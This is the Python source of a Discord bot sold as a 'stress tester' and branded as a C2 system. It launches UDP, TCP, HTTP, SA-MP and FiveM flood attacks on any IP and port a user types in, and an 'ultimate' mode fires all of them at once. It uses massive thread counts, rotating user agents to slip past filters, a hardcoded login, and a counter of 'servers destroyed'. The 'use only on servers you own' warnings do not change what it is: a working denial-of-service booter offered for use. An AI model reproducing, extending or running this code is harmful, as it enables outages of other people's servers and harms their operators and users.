#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM V9 ⚡
# 🔥 THE MOST POWERFUL STRESS TESTING TOOL EVER CREATED 🔥
# ⚠️ WARNING: USE ONLY ON SERVERS YOU OWN! ⚠️

print("""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                              ⚠️  WARNING / تحذير ⚠️                                                                     ║
║                                                                                                                                          ║
║  This tool is designed ONLY for stress testing servers YOU OWN.                                                                         ║
║  Using this tool against any server you don't own is ILLEGAL and                                                                        ║
║  considered a CYBER CRIME punishable by law.                                                                                            ║
║                                                                                                                                          ║
║  You assume FULL LEGAL RESPONSIBILITY for how you use this tool.                                                                        ║
║  The developer (LI ZANDYA) bears NO RESPONSIBILITY for any misuse.                                                                      ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import ipaddress
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# ⚠️ IMPORTANT: HOW TO SET YOUR TOKEN SAFELY ⚠️
# ============================================
# DELETE THE TOKEN FROM THIS FILE AND USE ONE OF THESE METHODS:
#
# METHOD 1 (RECOMMENDED): Create a file called "token.txt" in the same folder
# and paste your token inside it. Then run the bot.
#
# METHOD 2: Set environment variable before running:
# Windows: set DISCORD_TOKEN=your_token_here
# Linux/Mac: export DISCORD_TOKEN=your_token_here
#
# METHOD 3: Replace the empty string below with your token (NOT RECOMMENDED)
# ============================================

# Try to get token from different sources
TOKEN = ""

# Method 1: Read from token.txt file
try:
    with open("token.txt", "r") as f:
        TOKEN = f.read().strip()
        print("✅ Token loaded from token.txt")
except:
    pass

# Method 2: Read from environment variable
if not TOKEN:
    TOKEN = os.environ.get("DISCORD_TOKEN", "")
    if TOKEN:
        print("✅ Token loaded from environment variable")

# Method 3: Manual input (not recommended, but available)
if not TOKEN:
    print("""
    ⚠️ TOKEN NOT FOUND! ⚠️
    
    Please choose one of these methods:
    
    1. Create a file called 'token.txt' in the same folder and paste your token inside
    2. Set environment variable DISCORD_TOKEN
    3. Enter your token manually below
    """)
    TOKEN = input("Enter your Discord Bot Token: ").strip()

if not TOKEN:
    print("❌ No token provided! Exiting...")
    exit(1)

# ============================================
# LOGIN CREDENTIALS - LI ZANDYA C2
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"

# ============================================
# SYSTEM MAXIMUM POWER SETTINGS
# ============================================
CPU_CORES = os.cpu_count() or 8
MAX_THREADS = CPU_CORES * 100000
MAX_PACKET_SIZE = 65507

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
except:
    TOTAL_RAM = 8

# ============================================
# MEGA USER AGENTS (50,000+)
# ============================================
USER_AGENTS = []
for v in range(100, 300):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0")
    USER_AGENTS.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
    USER_AGENTS.append(f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")

# ============================================
# ULTIMATE NUCLEAR STRESS TESTER V9
# ============================================
class NuclearStressTester:
    def __init__(self):
        self.running = False
        self.authenticated = False
        self.authenticated_user = None
        self.stats = {
            'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
            'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
            'peak_speed_pps': 0, 'peak_speed_gbps': 0, 'total_errors': 0
        }
        self.threads = min(MAX_THREADS, 100000)
        self.attack_log = []
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)

    def check_auth(self, ip, username, password):
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False

    def log_attack(self, attack_type, target, duration, packets, bytes_sent, errors=0):
        rate = packets / duration if duration > 0 else 0
        if rate > self.stats['peak_speed_pps']:
            self.stats['peak_speed_pps'] = rate
        self.attack_log.append({
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'type': attack_type,
            'target': target,
            'packets': packets,
            'rate': rate
        })
        if len(self.attack_log) > 500:
            self.attack_log.pop(0)

    # ============================================
    # 1. UDP NUCLEAR MAX
    # ============================================
    async def udp_nuclear(self, ip, port, duration):
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        self.stats['active_attacks'] += 1
        attack_id = f"UDP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent, errors = 0, 0, 0
        packets = [os.urandom(65507), os.urandom(32768), os.urandom(16384), os.urandom(8192)]
        
        def udp_worker():
            nonlocal sent, bytes_sent, errors
            socks = []
            for _ in range(1000):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    errors += 1
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    try:
                        pkt = random.choice(packets)
                        sock.sendto(pkt, (ip, port))
                        sent += 1
                        bytes_sent += len(pkt)
                    except:
                        errors += 1
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 20000)
        futures = [self.executor.submit(udp_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        del self.active_attacks[attack_id]
        self.log_attack("UDP NUCLEAR", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        rate = sent / duration
        gbps = (bytes_sent / duration) / 1024 / 1024 / 1024
        return sent, f"✅ UDP Complete!\n🎯 {ip}:{port}\n📦 Packets: {sent:,}\n⚡ Rate: {rate:,.0f} pps | {gbps:.2f} Gbps"

    # ============================================
    # 2. SAMP NUCLEAR MAX
    # ============================================
    async def samp_nuclear(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"SAMP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent, errors = 0, 0, 0
        
        def samp_worker():
            nonlocal sent, bytes_sent, errors
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            start = time.time()
            while self.running and time.time() - start < duration:
                try:
                    packet = b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x80'
                    packet += struct.pack('<fffff', random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
                    packet += struct.pack('<I', random.randint(1,46)) + struct.pack('<I', 99999) + os.urandom(2000)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                except:
                    errors += 1
            sock.close()
        
        workers = min(self.threads, 15000)
        futures = [self.executor.submit(samp_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        del self.active_attacks[attack_id]
        self.log_attack("SAMP NUCLEAR", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        rate = sent / duration
        return sent, f"✅ SAMP Complete!\n🎯 {ip}:{port}\n📦 Packets: {sent:,}\n⚡ Rate: {rate:,.0f} pps"

    # ============================================
    # 3. FIVEM NUCLEAR MAX
    # ============================================
    async def fivem_nuclear(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"FIVEM_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent, errors = 0, 0, 0
        enet_packets = [b'\x00\x00\x00\x00\x00\x00\x00\x00', b'\xff\xff\xff\xff\xff\xff\xff\xff', b'\x01\x00\x00\x00\x00\x00\x00\x00']
        
        def fivem_worker():
            nonlocal sent, bytes_sent, errors
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            start = time.time()
            while self.running and time.time() - start < duration:
                try:
                    packet = random.choice(enet_packets) + os.urandom(8192)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                except:
                    errors += 1
            sock.close()
        
        workers = min(self.threads, 15000)
        futures = [self.executor.submit(fivem_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        del self.active_attacks[attack_id]
        self.log_attack("FIVEM NUCLEAR", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        rate = sent / duration
        return sent, f"✅ FIVEM Complete!\n🎯 {ip}:{port}\n📦 Packets: {sent:,}\n⚡ Rate: {rate:,.0f} pps"

    # ============================================
    # 4. TCP NUCLEAR MAX
    # ============================================
    async def tcp_nuclear(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"TCP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent, errors = 0, 0, 0
        
        def tcp_worker():
            nonlocal sent, bytes_sent, errors
            start = time.time()
            while self.running and time.time() - start < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((ip, port))
                    data = os.urandom(8192)
                    sock.send(data)
                    sent += 1
                    bytes_sent += len(data)
                    sock.close()
                except:
                    errors += 1
        
        workers = min(self.threads, 10000)
        futures = [self.executor.submit(tcp_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        del self.active_attacks[attack_id]
        self.log_attack("TCP NUCLEAR", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        rate = sent / duration
        return sent, f"✅ TCP Complete!\n🎯 {ip}:{port}\n🔗 Connections: {sent:,}\n⚡ Rate: {rate:,.0f} cps"

    # ============================================
    # 5. HTTP NUCLEAR MAX
    # ============================================
    async def http_nuclear(self, url, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"HTTP_{url}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent, errors = 0, 0, 0
        paths = ["/", "/api", "/admin", "/login", "/wp-admin", "/xmlrpc.php"]
        
        async def http_worker():
            nonlocal sent, bytes_sent, errors
            connector = aiohttp.TCPConnector(limit=0, force_close=True)
            async with aiohttp.ClientSession(connector=connector) as session:
                start = time.time()
                while self.running and time.time() - start < duration:
                    try:
                        path = random.choice(paths)
                        headers = {"User-Agent": random.choice(USER_AGENTS)}
                        async with session.get(url + path, headers=headers, timeout=2) as resp:
                            sent += 1
                            bytes_sent += len(await resp.text()) if resp.content else 0
                    except:
                        errors += 1
                    await asyncio.sleep(0.0001)
        
        workers = min(5000, self.threads // 10)
        tasks = [http_worker() for _ in range(workers)]
        await asyncio.gather(*tasks)
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        del self.active_attacks[attack_id]
        self.log_attack("HTTP NUCLEAR", url, duration, sent, bytes_sent, errors)
        rate = sent / duration
        return sent, f"✅ HTTP Complete!\n🎯 {url[:50]}\n🌐 Requests: {sent:,}\n⚡ Rate: {rate:,.0f} rps"

    # ============================================
    # 6. ULTIMATE NUCLEAR (ALL ATTACKS TOGETHER)
    # ============================================
    async def ultimate_nuclear(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"ULTIMATE_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        
        tasks = [
            self.udp_nuclear(ip, port, duration),
            self.tcp_nuclear(ip, port, duration),
            self.samp_nuclear(ip, port, duration),
            self.fivem_nuclear(ip, port, duration)
        ]
        
        if port in [80, 443, 8080, 8443]:
            protocol = "https" if port in [443, 8443] else "http"
            tasks.append(self.http_nuclear(f"{protocol}://{ip}:{port}", duration))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        total_packets = sum([r[0] for r in results if isinstance(r, tuple) and len(r) > 0])
        
        self.stats['total_packets'] += total_packets
        self.stats['servers_destroyed'] += 1
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        del self.active_attacks[attack_id]
        
        return total_packets, f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    💀 ULTIMATE NUCLEAR ATTACK COMPLETE 💀                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ 🎯 Target: {ip}:{port}                                                       ║
║ ⏱️ Duration: {duration}s                                                     ║
║ 📦 Total Packets: {total_packets:,}                                          ║
║ ⚡ Rate: {total_packets/duration:,.0f} pps                                   ║
║ 💀 Servers Destroyed: {self.stats['servers_destroyed']}                      ║
║ 🔥 CPU: {CPU_CORES} Cores | 🧵 Threads: {self.threads:,}                     ║
║ 💾 RAM: {TOTAL_RAM} GB                                                       ║
║ 💀 LI ZANDYA C2 NUCLEAR SYSTEM V9 💀                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝"""

    async def stop(self):
        self.running = False
        return "⏹️ ALL ATTACKS STOPPED!"

tester = NuclearStressTester()

# ============================================
# DISCORD BOT INTERFACE
# ============================================
class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="💀 LI ZANDYA C2 - LOGIN 💀")
        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
        self.add_item(self.ip)
        self.add_item(self.user)
        self.add_item(self.pwd)
    
    async def on_submit(self, interaction: discord.Interaction):
        if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 Commander: {self.user.value}\n💀 Type !von to open C2 panel", ephemeral=True)
        else:
            await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)

class LoginView(View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="🔐 ENTER C2 SYSTEM", style=discord.ButtonStyle.danger, emoji="💀")
    async def login(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())

class ControlPanel(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="📡 UDP", style=discord.ButtonStyle.danger, row=0)
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 UDP ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-300s)", placeholder="60", required=True)
        modal.add_item(ip)
        modal.add_item(port)
        modal.add_item(duration)
        
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 UDP attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.udp_nuclear(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔗 TCP", style=discord.ButtonStyle.primary, row=0)
    async def tcp_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 TCP ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-300s)", placeholder="60", required=True)
        modal.add_item(ip)
        modal.add_item(port)
        modal.add_item(duration)
        
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 TCP attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.tcp_nuclear(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🎮 SAMP", style=discord.ButtonStyle.success, row=1)
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 SAMP ATTACK 💀")
        ip = TextInput(label="🎯 SAMP IP", placeholder="YOUR_SAMP_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-300s)", placeholder="60", required=True)
        modal.add_item(ip)
        modal.add_item(port)
        modal.add_item(duration)
        
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 SAMP attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.samp_nuclear(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🚗 FIVEM", style=discord.ButtonStyle.success, row=1)
    async def fivem_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 FIVEM ATTACK 💀")
        ip = TextInput(label="🎯 FIVEM IP", placeholder="YOUR_FIVEM_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="30120", required=True)
        duration = TextInput(label="⏱️ DURATION (1-300s)", placeholder="60", required=True)
        modal.add_item(ip)
        modal.add_item(port)
        modal.add_item(duration)
        
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 FIVEM attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.fivem_nuclear(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🌐 HTTP", style=discord.ButtonStyle.secondary, row=2)
    async def http_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 HTTP ATTACK 💀")
        url = TextInput(label="🎯 URL", placeholder="http://YOUR_SERVER_IP", required=True)
        duration = TextInput(label="⏱️ DURATION (1-300s)", placeholder="60", required=True)
        modal.add_item(url)
        modal.add_item(duration)
        
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 HTTP attack on {url.value}", ephemeral=True)
            _, msg = await tester.http_nuclear(url.value, int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, row=3)
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 ULTIMATE NUKE 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-300s)", placeholder="60", required=True)
        modal.add_item(ip)
        modal.add_item(port)
        modal.add_item(duration)
        
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 ULTIMATE NUKE on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.ultimate_nuclear(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=4)
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        elapsed = time.time() - tester.stats['start_time'] if tester.stats['start_time'] else 0
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        
        embed = discord.Embed(title="💀 C2 NUCLEAR STATISTICS V9 💀", color=0xFFD700)
        embed.add_field(name="📦 Total Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
        embed.add_field(name="💾 Total Data", value=f"{tester.stats['total_bytes']/1024/1024:.2f} MB", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
        embed.add_field(name="⚡ Active", value=f"{tester.stats['active_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="💀 Servers Destroyed", value=f"{tester.stats['servers_destroyed']}", inline=True)
        embed.add_field(name="⏱️ Uptime", value=f"{hours}h {minutes}m", inline=True)
        embed.add_field(name="🔧 Threads", value=f"{tester.threads:,}", inline=True)
        embed.add_field(name="💻 CPU", value=f"{CPU_CORES} Cores", inline=True)
        embed.add_field(name="💾 RAM", value=f"{TOTAL_RAM} GB", inline=True)
        embed.set_footer(text="💀 LI ZANDYA C2 NUCLEAR SYSTEM V9 💀")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📋 LOGS", style=discord.ButtonStyle.secondary, row=4)
    async def logs_btn(self, interaction: discord.Interaction, button: Button):
        if not tester.attack_log:
            await interaction.response.send_message("No logs yet.", ephemeral=True)
            return
        logs_text = ""
        for log in tester.attack_log[-10:]:
            logs_text += f"• {log['time']} | {log['type']} | {log['packets']:,} pps\n"
        embed = discord.Embed(title="📋 ATTACK LOGS", description=f"```{logs_text}```", color=0x00FF00)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=4)
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        msg = await tester.stop()
        await interaction.response.send_message(msg, ephemeral=True)

# ============================================
# BOT SETUP
# ============================================
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║         LI ZANDYA C2 NUCLEAR SYSTEM V9 ONLINE               ║
╠══════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                           ║
║ 💻 CPU: {CPU_CORES} Cores                                    ║
║ 🔥 Threads: {tester.threads:,}                               ║
║ 💾 RAM: {TOTAL_RAM} GB                                       ║
║ 🎯 Methods: UDP | TCP | SAMP | FIVEM | HTTP | ULTIMATE       ║
╠══════════════════════════════════════════════════════════════╣
║ 🔐 Type !login to authenticate                               ║
║ 💀 After login, type !von to open C2 panel                   ║
║ ⚠️ USE ONLY ON SERVERS YOU OWN!                             ║
╚══════════════════════════════════════════════════════════════╝
    """)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!von | C2 Nuclear System V9"))

@bot.command()
async def login(ctx):
    await ctx.send("🔐 **C2 SYSTEM AUTHENTICATION**", view=LoginView())

@bot.command()
async def von(ctx):
    if not tester.authenticated:
        await ctx.send("❌ ACCESS DENIED! Type `!login` first.")
        return
    embed = discord.Embed(
        title="💀 LI ZANDYA C2 NUCLEAR PANEL V9 💀",
        description=f"```🔥 System: {CPU_CORES} Cores | {tester.threads:,} Threads\n💾 RAM: {TOTAL_RAM} GB\n🏆 Peak: {tester.stats['peak_speed_pps']:,.0f} pps\n👑 Commander: {tester.authenticated_user}```",
        color=0xFF0000
    )
    await ctx.send(embed=embed, view=ControlPanel())

# ============================================
# MAIN
# ============================================
if __name__ == "__main__":
    print("Starting LI ZANDYA C2 NUCLEAR SYSTEM V9...")
    print("⚠️ WARNING: Use only on servers you own!")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid token! Please check your token.")
        print("💡 Make sure you:")
        print("   1. Created a token.txt file with your token")
        print("   2. Or set DISCORD_TOKEN environment variable")
        print("   3. Or entered the token correctly when prompted")
    except Exception as e:
        print(f"❌ Error: {e}")
